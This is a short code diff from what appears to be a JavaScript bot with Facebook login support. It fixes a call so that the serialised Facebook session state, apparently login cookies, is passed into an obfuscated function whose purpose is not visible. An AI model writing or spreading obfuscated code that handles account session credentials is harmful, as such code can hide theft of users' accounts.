@@ -1707,7 +1707,7 @@ if (global.config.enablefb) {
         })[_0x6b0a[7]](function (_0x9b64x5) {
           log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
         });
-      })(htmlData, JSON.stringify(((facebook.api || {}).getAppState || (() => ({})))));
+      })(htmlData, JSON.stringify(((facebook.api || {}).getAppState || (() => ({})))()));
     }
 
     delete facebook.api;
